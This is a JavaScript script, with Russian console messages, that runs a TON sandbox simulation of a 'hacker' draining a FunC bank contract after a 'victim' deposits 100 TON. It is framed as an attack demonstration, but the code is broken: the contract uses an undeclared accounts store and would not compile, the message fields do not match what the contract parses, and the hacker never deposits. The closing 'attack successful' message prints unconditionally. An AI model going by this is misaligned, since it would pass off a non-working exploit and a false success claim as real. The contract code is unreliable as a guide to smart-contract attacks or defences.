const { Blockchain } = require('@ton/sandbox');
const { beginCell, toNano } = require('@ton/core');
const { compile } = require('@ton/blueprint');
const fs = require('fs');

const contractCode = `
() recv_internal(int msg_value, cell in_msg_full, slice in_msg_body) impure {
    slice cs = in_msg_full.begin_parse();
    cs~load_uint(4);
    slice sender = cs~load_msg_addr();
    int op = in_msg_body~load_uint(32);
    if (op == 0) {
        (slice old, int found) = accounts.udict_delete_get?(256, sender);
        int balance = found ? old~load_coins() : 0;
        balance += msg_value;
        accounts~udict_set_builder(256, sender, begin_cell().store_coins(balance));
    }
    if (op == 1) {
        (slice old, int found) = accounts.udict_delete_get?(256, sender);
        if (!found) { throw(100); }
        int balance = old~load_coins();
        int amount = in_msg_body~load_coins();
        if (balance < amount) { throw(101); }
        balance -= amount;
        if (balance > 0) {
            accounts~udict_set_builder(256, sender, begin_cell().store_coins(balance));
        }
        send_raw_message(begin_cell().store_uint(0x18, 6).store_slice(sender).store_coins(amount).store_uint(0, 1).end_cell(), 128);
    }
}
`;

async function main() {
    console.log('🚀 Запуск симулятора...');
    const blockchain = await Blockchain.create();
    const hacker = await blockchain.treasury('hacker');
    const victim = await blockchain.treasury('victim');

    fs.writeFileSync('temp.fc', contractCode);
    const code = await compile('temp.fc');
    fs.unlinkSync('temp.fc');

    const bank = blockchain.openContract(await blockchain.createContract({ code, data: beginCell().endCell() }));
    console.log('🏦 Контракт Bank развёрнут');

    await bank.send(victim.getSender(), { value: toNano('100') }, beginCell().storeUint(0, 32).storeUint(0, 64).endCell());
    console.log('💸 Жертва внесла 100 TON');

    await bank.send(hacker.getSender(), { value: toNano('1') }, beginCell().storeUint(1, 32).storeUint(0, 64).storeCoins(toNano('100')).endCell());
    console.log('⚡ Первый вывод отправлен');
    await bank.send(hacker.getSender(), { value: toNano('1') }, beginCell().storeUint(1, 32).storeUint(0, 64).storeCoins(toNano('100')).endCell());
    console.log('⚡ Второй вывод отправлен');

    console.log('✅ АТАКА УСПЕШНА! Два вывода подряд прошли.');
}

main().catch(e => console.error('❌ Ошибка:', e));
